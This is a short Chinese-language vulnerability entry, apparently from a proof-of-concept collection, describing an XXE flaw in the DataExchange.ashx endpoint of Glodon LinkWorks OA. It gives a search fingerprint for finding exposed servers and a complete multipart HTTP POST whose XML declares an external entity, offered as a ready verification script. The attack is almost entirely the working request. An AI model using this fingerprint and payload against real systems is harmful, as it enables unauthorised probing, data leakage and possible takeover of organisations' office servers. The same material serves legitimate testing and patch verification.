﻿# 广联达Linkworks DataExchange.ashx XXE漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：广联达LinkWorks办公OA（Office Automation）是一款综合办公自动化系统，旨在提高组织内部的工作效率和协作能力。它提供了一系列功能和工具，帮助企业管理和处理日常办公任务、流程和文档。该系统/GB/LK/Document/DataExchange/DataExchange.ashx接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。

> 漏洞特征：body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"

> 验证脚本：HTTP

```
POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta05yAIe0
Purpose: prefetch
Sec-Purpose: prefetch;prerender

------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="SystemName"

BIM
------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="Params"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY t SYSTEM "http://www.baidu.com">
]
>
<test>&t;</test>
------WebKitFormBoundaryJGgV5l5ta05yAIe0--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：广联达Linkworks DataExchange.ashx XXE漏洞.poc

